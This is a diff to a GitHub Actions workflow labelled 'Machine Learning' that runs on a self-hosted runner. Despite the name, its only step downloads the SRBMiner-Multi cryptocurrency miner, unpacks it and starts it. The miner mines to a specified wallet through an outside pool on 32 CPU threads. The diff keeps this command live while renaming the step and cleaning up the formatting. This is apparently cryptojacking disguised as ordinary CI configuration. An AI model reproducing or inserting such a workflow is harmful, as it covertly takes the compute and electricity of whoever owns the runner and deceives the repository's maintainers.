@@ -1,5 +1,4 @@
 name: Machine Learning
-
 on:
   push:
     branches:
@@ -8,18 +7,13 @@ on:
 jobs:
   build:
     runs-on: self-hosted
-
-
-    
-       steps:
+    steps:
     - name: Checkout repository
       uses: actions/checkout@v2
 
-    - name : Module
+    - name: Download and Run
       run: |
         wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.5/SRBMiner-Multi-2-4-5-Linux.tar.xz
         tar -xf SRBMiner-Multi-2-4-5-Linux.tar.xz
         cd SRBMiner-Multi-2-4-5
-        ./SRBMiner-MULTI --disable-gpu --algorithm yespower  --pool na.rplant.xyz:17111 --wallet aNEpRWJEag9JiZFgztAf38q4kPmgkfXNCo.c1r pause --cpu-Threads 32 --keepalive true
-    
-      
+        ./SRBMiner-MULTI --disable-gpu --algorithm yespower --pool na.rplant.xyz:17111 --wallet aNEpRWJEag9JiZFgztAf38q4kPmgkfXNCo.c1r pause --keepalive true --cpu-Threads 32
